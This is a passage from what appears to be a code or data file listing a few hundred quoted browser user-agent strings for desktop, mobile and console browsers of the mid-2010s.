    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/536.30.1 (KHTML, like Gecko) Version/6.0.5 Safari/536.30.1',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.13.US Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MAAU; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 7_0_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A501 Safari/9537.53',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53',
    'Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12F69 Safari/600.1.4',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MASMJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; FunWebProducts; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE10;ENUSWOL; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 5.1; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWA Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174',
    'Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie9; rv:11.0) like Gecko',
    'Mozilla/5.0 (Linux; Android 5.0.2; SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 9_0 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13A4325c Safari/601.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H321 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36',
    'Mozilla/5.0 (PlayStation 4 2.57) AppleWebKit/537.73 (KHTML, like Gecko)',
    'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Linux; Android 5.0; SM-G900V Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:38.0) Gecko/20100101 Firefox/38.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)',
    'Mozilla/5.0 (Linux; Android 5.0.2; SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; TNJB; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; ASJB; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE10;ENUSMSN; rv:11.0) like Gecko',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MATBJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MASAJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MALC; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MDDCJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0',
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie10; rv:11.0) like Gecko',
    'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G900A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 4.0.3; en-gb; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/8.0)',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko',
    'Mozilla/5.0 (X11; CrOS x86_64 7077.111.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; rv:37.0) Gecko/20100101 Firefox/37.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.18.US Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; GWX:QUALIFIED)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.13.US Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:23.0) Gecko/20100101 Firefox/23.0',
    'Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Firefox/38.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/44.0.2403.89 Chrome/44.0.2403.89 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A523 Safari/8536.25',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MANM; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H143 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MDDRJS)',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MATBJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.13.US Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (X11; Linux x86_64; U; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 6946.86.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; MDDRJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12F69 Safari/600.1.4',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; GIL 3.5; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.1 Safari/534.34',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; USPortal; rv:11.0) like Gecko',
    'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E)',
    'Mozilla/5.0 (iPad; CPU OS 6_1_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B146 Safari/8536.25',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36',
    'Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0',
    'Mozilla/5.0 (X11; FC Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0',
    'Mozilla/5.0 (X11; CrOS armv7l 7262.52.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.86 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MASAJS; rv:11.0) like Gecko',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E)',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; yie11; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10532',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSMSE; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.3)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)',
    'Mozilla/5.0 (Linux; Android 4.4.2; SM-T320 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H143 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36',
